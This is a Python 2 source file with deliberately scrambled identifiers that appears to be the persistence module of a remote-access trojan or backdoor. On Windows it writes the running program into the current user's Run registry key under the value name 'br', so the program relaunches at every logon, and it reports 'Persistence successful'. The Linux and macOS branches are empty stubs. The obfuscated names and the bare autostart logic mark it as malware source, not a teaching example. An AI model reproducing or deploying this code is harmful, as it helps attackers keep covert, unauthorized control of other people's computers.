# -*- coding: utf-8 -*-
import sys
def uUyZWkHWSOdTYfilpwjnhelPsDppMZFE():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    cfBWzFKsECElgKOHfyhJWcFojnxQuhbT = r'Software\Microsoft\Windows\CurrentVersion\Run'
    JCySfyrnzOSTWLQJAqDkIRxRCUgayRHg = sys.executable
    try:
        hTntgLtpCQtAiicYCchfnpjeqeIOuThh = _winreg.OpenKey(HKCU, cfBWzFKsECElgKOHfyhJWcFojnxQuhbT, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(hTntgLtpCQtAiicYCchfnpjeqeIOuThh, 'br', 0, _winreg.REG_SZ, JCySfyrnzOSTWLQJAqDkIRxRCUgayRHg)
        _winreg.CloseKey(hTntgLtpCQtAiicYCchfnpjeqeIOuThh)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def MmClNGqwhErzmiAgMdrHpsJUATDDnTJb():
    return False, 'nothing here yet'
def cAUhiiReMzPEGqivGinLAYeTuXdzHQWN():
    return False, 'nothing here yet'
def xWTiZYjcGlRKZbqRTGUReTzzfBOPCzBz(plat_type):
    if plat_type.startswith('win'):
        YfEyZddYudTLwgepZUQxPvQGgLXQejFV, TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy = uUyZWkHWSOdTYfilpwjnhelPsDppMZFE()
    elif plat_type.startswith('linux'):
        YfEyZddYudTLwgepZUQxPvQGgLXQejFV, TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy = MmClNGqwhErzmiAgMdrHpsJUATDDnTJb()
    elif plat_type.startswith('darwin'):
        YfEyZddYudTLwgepZUQxPvQGgLXQejFV, TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy = cAUhiiReMzPEGqivGinLAYeTuXdzHQWN()
    else:
        return 'Error, platform unsupported.'
    if YfEyZddYudTLwgepZUQxPvQGgLXQejFV:
        clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = 'Persistence successful, {}.'.format(TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy)
    else:
        clbTiTFqUxkqbuQVZtaTgDqCquqcATPC = 'Persistence unsuccessful, {}.'.format(TecLfOsrCYWEkewZNGaiwHTEjCfrNFAy)
    return clbTiTFqUxkqbuQVZtaTgDqCquqcATPC
